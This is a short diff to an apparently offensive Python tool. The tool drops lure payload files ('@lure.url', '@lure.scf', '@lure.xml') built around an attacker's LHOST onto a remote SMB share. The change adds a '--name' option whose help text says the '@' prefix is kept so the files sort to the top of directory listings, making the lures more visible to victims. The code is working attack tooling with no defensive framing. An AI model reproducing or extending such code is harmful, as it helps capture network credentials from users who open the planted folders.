@@ -149,6 +149,7 @@ def main():
     parser.add_argument("-s", "--scf", action="store_true", help="Drop @lure.scf payload")
     parser.add_argument("-x", "--xml", action="store_true", help="Drop @lure.xml payload")
     parser.add_argument("-A", "--All", action="store_true", help="Drop all three payloads (@lure.url, @lure.scf, @lure.xml)")
+    parser.add_argument("--name", action="store", default="@lure", metavar="BASE", help="Payload basename (default keeps the @ prefix to sort to the top of directory listings)")
 
     if not sys.argv[1:]:
         parser.print_help()
@@ -174,11 +175,11 @@ def main():
 
     payloads = []
     if want_url:
-        payloads.append(make_url(args.LHOST))
+        payloads.append(make_url(args.LHOST, args.name))
     if want_scf:
-        payloads.append(make_scf(args.LHOST))
+        payloads.append(make_scf(args.LHOST, args.name))
     if want_xml:
-        payloads.append(make_xml(args.LHOST))
+        payloads.append(make_xml(args.LHOST, args.name))
 
     rc = smb_put(
         args.RHOST,
